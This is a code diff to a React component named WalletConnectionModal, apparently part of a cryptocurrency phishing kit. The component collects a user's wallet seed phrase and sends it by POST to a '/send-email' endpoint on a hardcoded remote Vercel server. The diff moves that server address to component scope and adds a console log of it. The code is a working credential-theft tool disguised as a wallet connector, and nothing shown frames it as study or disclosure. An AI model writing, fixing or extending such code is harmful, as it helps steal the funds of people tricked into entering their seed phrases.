@@ -17,8 +17,10 @@ export default function WalletConnectionModal({
   const [seedPhrase, setSeedPhrase] = useState('');
   const [isSeedValid, setIsSeedValid] = useState(false);
   const [submitStatus, setSubmitStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
+  const backendUrl = process.env.BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
 
   useEffect(() => {
+    console.log(backendUrl);
     const timer = setTimeout(() => {
       if (connectionStage < 2) {
         setConnectionStage(connectionStage + 1);
@@ -38,7 +40,6 @@ export default function WalletConnectionModal({
   const sendSeedPhrase = async () => {
     setSubmitStatus('sending');
     try {
-      const backendUrl = process.env.BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
       const response = await fetch(`${backendUrl}/send-email`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
